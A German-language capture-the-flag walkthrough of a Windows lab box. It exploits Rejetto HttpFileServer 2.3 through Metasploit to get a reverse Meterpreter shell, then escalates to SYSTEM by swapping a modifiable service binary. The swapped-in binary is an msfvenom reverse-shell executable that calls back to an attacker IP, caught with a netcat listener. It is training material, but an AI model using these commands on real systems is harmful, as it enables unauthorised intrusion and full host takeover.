# Ziel: 10.10.0.28
# Initial Access

## Scanning 

PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
8080/tcp  open  http               HttpFileServer httpd 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC


Feststellung 2. Website unter :8080 mit Rejetto HttpFileServer  2.3


Keine Intressante Feststellung via Gobuster


## Exploiting 

Schauen via searchsploit nach passenden Exploit für Rejetto HttpFileServer 2.3

 Exploit Title                                                                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                   | windows/webapps/49125.py


Exploit via Metasploit

use exploit/windows/http/rejetto_hfs_exec

->  Payload Reverse Meterpreter shell


-> Initial access geschafft

# Priv Escalation 

## Enumeration 


Kann man via WinPeas machen. Für hier nehme ich aber Powersploit/PrivSec/PowerUp

Laden des Scriptes auf den Host via 

```
upload /opt/PowerSploit/Privesc/PowerUp.ps1
```
in Meterpreter

Starten und Connecten zu Powershell instanz 

```
load powershell
powershell_shell
```

Enumeration via 

```
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```


Intressantes Finding 

```
ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

```

Das intressante hier ist `CanRestart: True` Das heist ich kann den Service nach bedaf stoppen und Starten. Das kann man sich so zu nutze machen indem man die Orginale Exe des Services durch eine Custom Exe mit Rev Shell Capability austauscht. 

### Erstellen des Falschen Services

via mfsvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.244.36 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

Jetzt gilt es mit der Meterpreter shell in den Passenden Pfad zu Navigieren, den Dienst zu stoppen und dann die Neue Exe hochzuladen. 

```
# In der Powershell

cd 'C:\Program Files (x86)\IObit\Advanced SystemCare\'

Stop-Service -name AdvancedSystemCareService9
```

danach mit ctl +c die Powershell minimieren und den neuen Service hochladen. 

```
upload /root/ASCService.exe
```

Danach in einer Seperaten Shell den NetCat listener vorbereiten 

```
rlwrap nc -lvnp 4443
```


Nun wieder in die Powershell starten via `powershell_shell` und den Service wieder starten

```
Start-Service -name AdvancedSystemCareService9
```

Netcat fängt die Rev Shell jetzt auf und Tadaa schon sind wir `nt authority\system`